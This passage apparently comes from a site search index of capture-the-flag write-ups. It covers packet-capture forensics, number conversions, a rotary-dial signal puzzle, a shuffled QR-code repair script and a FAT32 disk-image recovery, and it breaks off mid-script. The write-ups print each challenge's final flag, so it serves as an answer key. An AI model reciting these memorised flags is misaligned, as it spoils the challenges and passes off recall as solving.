shark1.pcapng . Hints (None) Approach I opened shark1.pcapng with Wireshark . I followed the TCP stream: Stream 5 ( tcp.stream eq 5 ) contained something that looked promising Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs} After decoding that with ROT13 , the flag was revealed. Flag picoCTF{p33kab00_1_s33_u_deadbeef} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Wireshark%20doo%20dooo%20do%20doo/Wireshark%20doo%20dooo%20do%20doo.md","title":"Wireshark doo dooo do doo..."},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#wireshark-doo-dooo-do-doo","text":"Category: Forensics Source: picoCTF 2021 Author: DYLAN Score: 5","title":"Wireshark doo dooo do doo..."},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#description","text":"Can you find the flag? shark1.pcapng .","title":"Description"},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#hints","text":"(None)","title":"Hints"},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#approach","text":"I opened shark1.pcapng with Wireshark . I followed the TCP stream: Stream 5 ( tcp.stream eq 5 ) contained something that looked promising Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs} After decoding that with ROT13 , the flag was revealed.","title":"Approach"},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#flag","text":"picoCTF{p33kab00_1_s33_u_deadbeef}","title":"Flag"},{"location":"Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Wireshark%20doo%20dooo%20do%20doo/Wireshark%20doo%20dooo%20do%20doo.md","title":"Reference"},{"location":"Writeup/General%20Skills/2Warm/","text":"2Warm Category: General Skills Source: picoCTF 2019 Author: SANJAY C/DANNY TUNITIS Score: 5 Description Can you convert the number 42 (base 10) to binary (base 2)? Hints Submit your answer in our competition's flag format. For example, if your answer was '11111', you would submit 'picoCTF{11111}' as the flag. Solution This problem is a simple base conversion problem, converting a decimal (base 10) number to a binary (base 2) number. The easiest way to tackle it is to just put it through a base conversion online site such as RapidTables . Flag picoCTF{101010} Reference Writeup from https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/General%20Skills/2Warm/README.md","title":"2Warm"},{"location":"Writeup/General%20Skills/2Warm/#2warm","text":"Category: General Skills Source: picoCTF 2019 Author: SANJAY C/DANNY TUNITIS Score: 5","title":"2Warm"},{"location":"Writeup/General%20Skills/2Warm/#description","text":"Can you convert the number 42 (base 10) to binary (base 2)?","title":"Description"},{"location":"Writeup/General%20Skills/2Warm/#hints","text":"Submit your answer in our competition's flag format. For example, if your answer was '11111', you would submit 'picoCTF{11111}' as the flag.","title":"Hints"},{"location":"Writeup/General%20Skills/2Warm/#solution","text":"This problem is a simple base conversion problem, converting a decimal (base 10) number to a binary (base 2) number. The easiest way to tackle it is to just put it through a base conversion online site such as RapidTables .","title":"Solution"},{"location":"Writeup/General%20Skills/2Warm/#flag","text":"picoCTF{101010}","title":"Flag"},{"location":"Writeup/General%20Skills/2Warm/#reference","text":"Writeup from https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/General%20Skills/2Warm/README.md","title":"Reference"},{"location":"Writeup/General%20Skills/ChieftainsSecret/","text":"ChieftainsSecret Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10 Description Our agent risked his life to install a mysterious device in the immemorial telephone, can you find out the chieftain's telephone number? Flag format: flag{11 digits} ChieftainsSecret.zip \u9898\u76ee\u63cf\u8ff0 \u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u56fe\u79cd\uff0c\u89e3\u538b\u5f97\u5230\u4e00\u4e2a\u7535\u8def\u56fe\u548c\u4e24\u5343\u591a\u7ec4\u6570\u636e\u3002 Misc\u4eb2\u7239\u7684\u89e3\u7b54 \u7ed3\u5408\u56fe\u7247\u63a8\u65ad\u8fd9\u662f\u8f6c\u52a8\u7801\u76d8\u7684\u8fc7\u7a0b\u8bb0\u5f55\uff0c\u67e5\u9605\u6587\u6863\u53ef\u5f97\u5230\u4e00\u7cfb\u5217\u6bcf\u6b21\u7801\u76d8\u8f6c\u52a8\u7684\u5ea6\u6570\u3002 \u6570\u636e\u53ef\u8fdb\u884c\u5904\u7406\uff0c\u5f97\u5230sin\u503c\u4e0ecos\u503c\uff1a def get_sin(i): return (data['PC0'][i] - (data['PC0'][i] + data['PC1'][i]) / 2) / 1000 def get_cos(i): return (data['PC2'][i] - (data['PC2'][i] + data['PC3'][i]) / 2) / 1000 \u5e76\u7ed8\u56fe\uff1a \u5927\u6982\u5c31\u662f\u62a0\u51fa\u5cf0\u503c \u6b63\u5f26\u548c\u4f59\u5f26\u7b97\u51fa\u540e\u5f97\u5230\u4e00\u4e2a\u7a7a\u95f4\u5750\u6807\u5206\u5e03 _map = '1234567890' ps = [3, 3, 0, 2, 5, 1, 4, 9, 6, 5, 3] print(''.join([_map[i] for i in ps])) print(''.join([_map[::-1][i] for i in ps])) ps = [3, 3, 0, 2, 5, 1, 4, 8, 6, 5, 3] print(''.join([_map[i] for i in ps])) print(''.join([_map[::-1][i] for i in ps])) Flag flag{77085962457} Reference Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"ChieftainsSecret"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#chieftainssecret","text":"Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10","title":"ChieftainsSecret"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#description","text":"Our agent risked his life to install a mysterious device in the immemorial telephone, can you find out the chieftain's telephone number? Flag format: flag{11 digits} ChieftainsSecret.zip","title":"Description"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#_1","text":"\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u56fe\u79cd\uff0c\u89e3\u538b\u5f97\u5230\u4e00\u4e2a\u7535\u8def\u56fe\u548c\u4e24\u5343\u591a\u7ec4\u6570\u636e\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#misc","text":"\u7ed3\u5408\u56fe\u7247\u63a8\u65ad\u8fd9\u662f\u8f6c\u52a8\u7801\u76d8\u7684\u8fc7\u7a0b\u8bb0\u5f55\uff0c\u67e5\u9605\u6587\u6863\u53ef\u5f97\u5230\u4e00\u7cfb\u5217\u6bcf\u6b21\u7801\u76d8\u8f6c\u52a8\u7684\u5ea6\u6570\u3002 \u6570\u636e\u53ef\u8fdb\u884c\u5904\u7406\uff0c\u5f97\u5230sin\u503c\u4e0ecos\u503c\uff1a def get_sin(i): return (data['PC0'][i] - (data['PC0'][i] + data['PC1'][i]) / 2) / 1000 def get_cos(i): return (data['PC2'][i] - (data['PC2'][i] + data['PC3'][i]) / 2) / 1000 \u5e76\u7ed8\u56fe\uff1a \u5927\u6982\u5c31\u662f\u62a0\u51fa\u5cf0\u503c \u6b63\u5f26\u548c\u4f59\u5f26\u7b97\u51fa\u540e\u5f97\u5230\u4e00\u4e2a\u7a7a\u95f4\u5750\u6807\u5206\u5e03 _map = '1234567890' ps = [3, 3, 0, 2, 5, 1, 4, 9, 6, 5, 3] print(''.join([_map[i] for i in ps])) print(''.join([_map[::-1][i] for i in ps])) ps = [3, 3, 0, 2, 5, 1, 4, 8, 6, 5, 3] print(''.join([_map[i] for i in ps])) print(''.join([_map[::-1][i] for i in ps]))","title":"Misc\u4eb2\u7239\u7684\u89e3\u7b54"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#flag","text":"flag{77085962457}","title":"Flag"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"Reference"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/","text":"Lets Warm Up Category: General Skills Source: picoCTF 2019 Author: SANJAY C/DANNY TUNITIS Score: 5 Description If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII? Hints Submit your answer in our flag format. For example, if your answer was 'hello', you would submit 'picoCTF{hello}' as the flag. Solution We are given a hexadecimal value and asked the convert it to ASCII. The easiest way to go around this is to just put it through a hex-to-ascii conversion online site such as RapidTables . Flag picoCTF{p} Reference Writeup from https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/General%20Skills/Lets%20Warm%20Up/README.md","title":"Lets Warm Up"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#lets-warm-up","text":"Category: General Skills Source: picoCTF 2019 Author: SANJAY C/DANNY TUNITIS Score: 5","title":"Lets Warm Up"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#description","text":"If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?","title":"Description"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#hints","text":"Submit your answer in our flag format. For example, if your answer was 'hello', you would submit 'picoCTF{hello}' as the flag.","title":"Hints"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#solution","text":"We are given a hexadecimal value and asked the convert it to ASCII. The easiest way to go around this is to just put it through a hex-to-ascii conversion online site such as RapidTables .","title":"Solution"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#flag","text":"picoCTF{p}","title":"Flag"},{"location":"Writeup/General%20Skills/Lets%20Warm%20Up/#reference","text":"Writeup from https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/General%20Skills/Lets%20Warm%20Up/README.md","title":"Reference"},{"location":"Writeup/General%20Skills/shuffle_code/","text":"shuffle_code Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 45 Description _shuffle_code.zip \u9898\u76ee\u63cf\u8ff0 \u9898\u76ee\u9644\u4ef6\u7ed9\u51fa\u6765\u7684\u62d6\u5165010 editor\u67e5\u770b\uff0c\u53d1\u73b0\u662f\u4e2a\u5012\u7740\u7684PNG\u3002\u5c06\u5176\u5012\u56de\u6765\uff0c\u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 \u5f00\u5c40\u4e00\u4e2a\u7801 \u6211\u7684\u89e3\u7b54 \u4e8c\u7ef4\u7801\u626b\u7801\u5f97\uff1a col426327/1132122/1211132223/3113253/61531113/111312/5323125/2222/11122153/311111/14312121/11231211/2423211/262121/422221/622132/31121/221122111/5122311/2111221221/121692/12122111/232326/11142121/31253151/22111111123/111313121/1111111/2151371 row31121113/12321133/13111112/13112221121/12112232/16113232/11311311/21111231/11111211/711111117/2124112211/611111241/1311371/131152131/13/2121111311/521(11)11/1311321131/1211211/11111111/14221262/3411131/161713/422141/7122117/1111112111/7111412/71111121/131112131 \u53ef\u80fd\u90a3\u4e2a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u5c31\u662f11\u8fd9\u4e00\u4e2a\u6570\uff0c\u5176\u4ed6\u90fd\u505a\u4e00\u4f4d\u6570\u89e3\uff0c\u5e76\u4e14\u8fd9\u4e9b\u6570\u957f\u5ea6\u96c6\u4e2d\u57286, 7, 8, 9, 10\u3002 \u731c\u6d4b\u9898\u76ee\u7684\u95ee\u9898\u5f62\u5f0f\u662f\u6570\u7ec7\uff0c\u63a5\u4e0b\u6765\u5c31\u662fMisc\u4eb2\u7239\u7684\u4e2a\u4eba\u79c0\uff1a Misc\u4eb2\u7239\u7684showtime \u6211\u770b\u4e0d\u61c2\uff0c\u4f46\u6211\u5927\u53d7\u9707\u64bc \u53c8\u753129*29\u63a8\u65ad\u53ef\u80fd\u662f\u4e2a\u4e8c\u7ef4\u7801\uff0c\u6309\u884c\u6253\u4e71\u3002\u6839\u636e\u4e8c\u7ef4\u7801\u89c4\u8303\u89e3\u51fa\u56fa\u5b9a\u4f4d\u7f6e\u5e76\u53cd\u5411\u66f4\u65b0\u6570\u7ec7\u3002 \u6700\u540e\u53ea\u6709\u4e2d\u95f4\u90e8\u5206\u7684\u987a\u5e8f\u4e0d\u77e5\u9053\uff0c\u5171 \u79cd\u53ef\u80fd\u6027\uff0c\u4f7f\u7528\u7a0b\u5e8f\u7a77\u4e3e\u3002 \u8fd9\u4e5f\u80fd\u4fee\uff0c\u4e0d\u6127\u662fMisc\u4eb2\u7239 data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1], [1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1], [1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1], [1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1], [1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1], [1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1], [1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1], [0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0], [1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1], [1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1], [1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1], [0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1], [1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1], [1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0], [0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0], [1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1], [0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1], [1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0], [1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1], [1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1], [1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1], [0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0], [1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0], [1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0], [1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0], [1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1], [1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1], [1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1], [1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image, ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [9, 11, 13, 15, 17, 19] shuffle_2 = [10, 12, 14, 16, 18] head = data[0:9] tail = data[20:] def body(body_1, body_2): body = [] for i in range(5): body.append(body_1[i]) body.append(body_2[i]) body.append(body_1[5]) return [data[i] for i in body] def draw_img(data): assert len(data) == 29 and len(data[0]) == 29 img = Image.new('RGB', (31, 31), (255,255,255)) for i, row in enumerate(data): for j, pixel in enumerate(row): img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255)) return img with tqdm(total=720 * 120) as pbar: for body_1 in permutations(shuffle_1): for body_2 in permutations(shuffle_2): im = draw_img(head + body(body_1, body_2) + tail) barcodes = pyzbar.decode(im) pbar.update(1) if(len(barcodes) == 0): continue for barcode in barcodes: barcodeData = barcode.data.decode(\"utf-8\") print(barcodeData) plt.imshow(im) plt.show() \u4fee\u590d\u6210\u529f\u7684\u4e8c\u7ef4\u7801\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7239\u4e2d\u7239\uff0c\u4ee3\u4e2d\u4ee3 Flag flag{f31861a9-a753-47d5-8660-a8cada6c599e} \u8fd9\u4e00\u8840\u771f\u7684\uff0c\u592a\u79c0\u4e86\uff0c\u7ed9\u4ed6\u5012\u6d17\u811a\u6c34\u53bb\u4e86 Reference Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"shuffle_code"},{"location":"Writeup/General%20Skills/shuffle_code/#shuffle_code","text":"Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 45","title":"shuffle_code"},{"location":"Writeup/General%20Skills/shuffle_code/#description","text":"_shuffle_code.zip","title":"Description"},{"location":"Writeup/General%20Skills/shuffle_code/#_1","text":"\u9898\u76ee\u9644\u4ef6\u7ed9\u51fa\u6765\u7684\u62d6\u5165010 editor\u67e5\u770b\uff0c\u53d1\u73b0\u662f\u4e2a\u5012\u7740\u7684PNG\u3002\u5c06\u5176\u5012\u56de\u6765\uff0c\u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 \u5f00\u5c40\u4e00\u4e2a\u7801","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/General%20Skills/shuffle_code/#_2","text":"\u4e8c\u7ef4\u7801\u626b\u7801\u5f97\uff1a col426327/1132122/1211132223/3113253/61531113/111312/5323125/2222/11122153/311111/14312121/11231211/2423211/262121/422221/622132/31121/221122111/5122311/2111221221/121692/12122111/232326/11142121/31253151/22111111123/111313121/1111111/2151371 row31121113/12321133/13111112/13112221121/12112232/16113232/11311311/21111231/11111211/711111117/2124112211/611111241/1311371/131152131/13/2121111311/521(11)11/1311321131/1211211/11111111/14221262/3411131/161713/422141/7122117/1111112111/7111412/71111121/131112131 \u53ef\u80fd\u90a3\u4e2a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u5c31\u662f11\u8fd9\u4e00\u4e2a\u6570\uff0c\u5176\u4ed6\u90fd\u505a\u4e00\u4f4d\u6570\u89e3\uff0c\u5e76\u4e14\u8fd9\u4e9b\u6570\u957f\u5ea6\u96c6\u4e2d\u57286, 7, 8, 9, 10\u3002 \u731c\u6d4b\u9898\u76ee\u7684\u95ee\u9898\u5f62\u5f0f\u662f\u6570\u7ec7\uff0c\u63a5\u4e0b\u6765\u5c31\u662fMisc\u4eb2\u7239\u7684\u4e2a\u4eba\u79c0\uff1a","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/General%20Skills/shuffle_code/#miscshowtime","text":"\u6211\u770b\u4e0d\u61c2\uff0c\u4f46\u6211\u5927\u53d7\u9707\u64bc \u53c8\u753129*29\u63a8\u65ad\u53ef\u80fd\u662f\u4e2a\u4e8c\u7ef4\u7801\uff0c\u6309\u884c\u6253\u4e71\u3002\u6839\u636e\u4e8c\u7ef4\u7801\u89c4\u8303\u89e3\u51fa\u56fa\u5b9a\u4f4d\u7f6e\u5e76\u53cd\u5411\u66f4\u65b0\u6570\u7ec7\u3002 \u6700\u540e\u53ea\u6709\u4e2d\u95f4\u90e8\u5206\u7684\u987a\u5e8f\u4e0d\u77e5\u9053\uff0c\u5171 \u79cd\u53ef\u80fd\u6027\uff0c\u4f7f\u7528\u7a0b\u5e8f\u7a77\u4e3e\u3002 \u8fd9\u4e5f\u80fd\u4fee\uff0c\u4e0d\u6127\u662fMisc\u4eb2\u7239 data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1], [1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1], [1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1], [1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1], [1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1], [1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1], [1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1], [0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0], [1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1], [1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1], [1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1], [0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1], [1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1], [1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0], [0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0], [1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1], [0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1], [1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0], [1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1], [1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1], [1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1], [0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0], [1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0], [1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0], [1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0], [1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1], [1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1], [1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1], [1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image, ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [9, 11, 13, 15, 17, 19] shuffle_2 = [10, 12, 14, 16, 18] head = data[0:9] tail = data[20:] def body(body_1, body_2): body = [] for i in range(5): body.append(body_1[i]) body.append(body_2[i]) body.append(body_1[5]) return [data[i] for i in body] def draw_img(data): assert len(data) == 29 and len(data[0]) == 29 img = Image.new('RGB', (31, 31), (255,255,255)) for i, row in enumerate(data): for j, pixel in enumerate(row): img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255)) return img with tqdm(total=720 * 120) as pbar: for body_1 in permutations(shuffle_1): for body_2 in permutations(shuffle_2): im = draw_img(head + body(body_1, body_2) + tail) barcodes = pyzbar.decode(im) pbar.update(1) if(len(barcodes) == 0): continue for barcode in barcodes: barcodeData = barcode.data.decode(\"utf-8\") print(barcodeData) plt.imshow(im) plt.show() \u4fee\u590d\u6210\u529f\u7684\u4e8c\u7ef4\u7801\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7239\u4e2d\u7239\uff0c\u4ee3\u4e2d\u4ee3","title":"Misc\u4eb2\u7239\u7684showtime"},{"location":"Writeup/General%20Skills/shuffle_code/#flag","text":"flag{f31861a9-a753-47d5-8660-a8cada6c599e} \u8fd9\u4e00\u8840\u771f\u7684\uff0c\u592a\u79c0\u4e86\uff0c\u7ed9\u4ed6\u5012\u6d17\u811a\u6c34\u53bb\u4e86","title":"Flag"},{"location":"Writeup/General%20Skills/shuffle_code/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"Reference"},{"location":"Writeup/General%20Skills/xixixi/","text":"xixixi Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 50 Description \u5ba4\u53cb\u6700\u8fd1\u6c89\u8ff7y\u795e\uff0c\u53c8\u6c2a\u53c8\u809d\uff0c\u8fd8ghs\u3002\u4e3a\u4e86\u4ed6\u7684\u8eab\u4f53\u7740\u60f3\uff0c\u6211\u628a\u4ed6\u7684s\u56fe\u6574\u6ca1\u4e86\u3002\u4f46\u6211\u660e\u660e\u5220\u4e86\u811a\u672c\u554a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u80fd\u88ab\u4ed6\u53d1\u73b0......8\u8bf4\u4e86\uff0c\u533b\u9662\u7684\u7a7a\u8c03\u771f\u8212\u670d~ Solution \u78c1\u76d8\u5185\u6240\u6709\u5185\u5bb9\u5982\u4e0b\uff1a\uff08\u53ef\u7528winhex\u76f4\u63a5\u590d\u539f\uff09 # !i.py import struct from xixi import FAT32Parser from xixixi import Padding, picDepartList def EncodePieces(): global clusterList res = [] Range = len(picDepartList) # 58 # GetRandomClusterList(n) - Generate a random cluster list with length n clusterList = GetRandomClusterList(Range) for i in range(Range): if i != Range - 1: newCRC = struct.pack(\"<I\", clusterList[i+1]) plainData = picDepartList[i][:-4] + newCRC else: plainData = picDepartList[i] # Show the first piece to him, hhh if i == 0: newPiece = plainData else: newPiece = '' key = clusterList[i] & 0xFE for j in plainData: newPiece += chr(ord(j) ^ key) # Padding() -- Fill to an integral multiple of 512 with \\xFF res.append(Padding(newPiece)) return res # !ixi.py import struct class FAT32Parser(object): def __init__(self, vhdFileName): with open(vhdFileName, 'rb') as f: self.diskData = f.read() self.DBR_off = self.GetDBRoff() self.newData = ''.join(self.diskData) def GetDBRoff(self): DPT_off = 0x1BE target = self.diskData[DPT_off+8:DPT_off+12] DBR_sector_off, = struct.unpack(\"<I\", target) return DBR_sector_off * 512 def GetFAT1off(self): target = self.diskData[self.DBR_off+0xE:self.DBR_off+0x10] FAT1_sector_off, = struct.unpack(\"<H\", target) return self.DBR_off + FAT1_sector_off * 512 def GetFATlength(self): target = self.diskData[self.DBR_off+0x24:self.DBR_off+0x28] FAT_sectors, = struct.unpack(\"<I\", target) return FAT_sectors * 512 def GetRootoff(self): FAT_length = self.GetFATlength() FAT2_off = self.GetFAT1off() + FAT_length return FAT2_off + FAT_length def Cluster2FAToff(self, cluster): FAT1_off = self.GetFAT1off() return FAT1_off + cluster * 4 def Cluster2DataOff(self, cluster): rootDir_off = self.GetRootoff() return rootDir_off + (cluster - 2) * 512 \u5206\u6790\u4e24\u4e2a\u6587\u4ef6\uff0c\u53ef\u4ee5\u5f97\u51fa\uff1a !ixi.py\u4e2d\u7684\u7c7bFAT32Parser\uff0c\u53ef\u4ee5\u5bf9\u78c1\u76d8\u8fdb\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002!i.py\u4e2d\u7684\u6587\u4ef6\u662f\u5bf9\u6587\u4ef6\u8fdb\u884c\u5206\u5757\u513f\u5904\u7406\uff0c\u5e76\u4e14\u56fe\u7247\u88ab\u5206\u4e3a\u4e8658\u5757\u513f\uff0c\u9664\u4e86\u7b2c\u4e00\u5757\u513f\u672a\u88ab\u52a0\u5bc6\u5916\uff0c\u5176\u4f59\u5757\u513f\u90fd\u8fdb\u884c\u4e86\u5982\u4e0b\u5904\u7406\uff1a \u6bcf\u5757\u513f\u7684\u6700\u540e\u56db\u4f4d\uff0c\u5373CRC\u6821\u9a8c\u503c\u88ab\u66ff\u6362\u6210\u4e86\u4e0b\u4e00\u5757\u513f\u6240\u5728\u7684\u7c07\u53f7\u3002 \u9664\u7b2c\u4e00\u5757\u513f\u5916\uff0c\u5176\u4f59\u5757\u513f\u7684\u5185\u5bb9\u90fd\u4f1a\u4e0e\u8be5\u5757\u513f\u7684\u7c07\u53f7 & 0xFE\u6574\u4f53\u8fdb\u884c\u5f02\u6216\u3002 \u6240\u4ee5\u60f3\u8981\u53cd\u89e3\u56fe\u7247\u5757\u513f\uff0c\u9700\u8981\u5bf9\u6bcf\u4e2a\u5757\u513f\u5148\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\uff0c\u518d\u67e5\u770b\u540e\u56db\u4f4d\u5f97\u5230\u4e0b\u4e00\u5757\u513f\u7684\u7c07\u53f7\u3002 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Tr0jAn <Tr0jAn@birkenwald.cn> # @Date : 2020-11-22 import struct import binascii from xixi import FAT32Parser def read(n): global key binary = b'' for i in vhd.read(n): binary += (i ^ (key & 